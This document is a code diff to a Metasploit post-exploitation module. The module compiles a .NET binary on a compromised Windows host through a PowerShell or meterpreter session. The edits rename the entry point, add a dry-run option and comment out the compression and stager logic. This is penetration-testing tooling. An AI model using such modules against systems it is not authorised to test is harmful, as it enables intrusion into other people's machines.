@@ -41,9 +41,9 @@ class MetasploitModule < Msf::Post
         OptString.new('ASSEMBLIES', [
           false,
           'Any assemblies outside the defaults',
-          "mscorlib.dll, System.dll, System.Xml.dll, System.Data.dll, System.Net.dll"
+          "mscorlib.dll, System.dll, System.Xml.dll, System.Data.dll"
         ]),
-        OptString.new('OUTPUT_TARGET', [true, 'Name and path of the generated binary, default random, omit extension' ]),
+        OptString.new('OUTPUT_TARGET', [false, 'Name and path of the generated binary, default random, omit extension' ]),
         OptString.new('COMPILER_OPTS', [false, 'Options to pass to compiler', '/optimize']),
         OptString.new('CODE_PROVIDER', [true, 'Code provider to use', 'Microsoft.CSharp.CSharpCodeProvider']),
 
@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Post
 
   end
 
-  def exploit
+  def run
 
     # Make sure we meet the requirements before running the script
     if !(session.type == "meterpreter" || have_powershell?)
@@ -82,18 +82,22 @@ class MetasploitModule < Msf::Post
     net_com_opts[:cert] = datastore['CERT_PATH']
 
     begin
-      script = ::File.read(datastore['SOURCE_FILE'])
+      net_com_opts[:harness] = ::File.read(datastore['SOURCE_FILE'])
+      script = dot_net_compiler(net_com_opts)
+      if datastore['Powershell::Post::dry_run']
+        print_good("Compiler code:\n#{script}")
+        return
+      end
     rescue => e
       print_error(e)
       return
     end
 
     vprint_good("Writing to #{net_com_opts[:target]}")
-
     # Compress
     print_status('Compressing script contents:')
     compressed_script = compress_script(script, eof)
-
+=begin
     # If the compressed size is > 8100 bytes, launch stager
     if (compressed_script.size > 8100)
       print_error(" - Compressed size: #{compressed_script.size}")
@@ -107,9 +111,10 @@ class MetasploitModule < Msf::Post
       print_good(" - Compressed size: #{compressed_script.size}")
       script = compressed_script
     end
-
+=end
     # Execute the powershell script
     print_status('Executing the script.')
+    #psh_exec(script,false,true)
     cmd_out, running_pids, open_channels = execute_script(script, true)
     get_ps_output(cmd_out,eof)
     vprint_good( "Cleaning up #{running_pids.join(', ')}" )
@@ -119,7 +124,7 @@ class MetasploitModule < Msf::Post
     # Check for result
     begin
       size = session.fs.file.stat(net_com_opts[:target].gsub('\\','\\\\')).size
-      vprint_good("File #{net_com_opts[:target].gsub('\\','\\\\')} found, #{size}kb")
+      print_good("File #{net_com_opts[:target].gsub('\\','\\\\')} found, #{size}kb")
     rescue
       print_error("File #{net_com_opts[:target].gsub('\\','\\\\')} not found")
       return
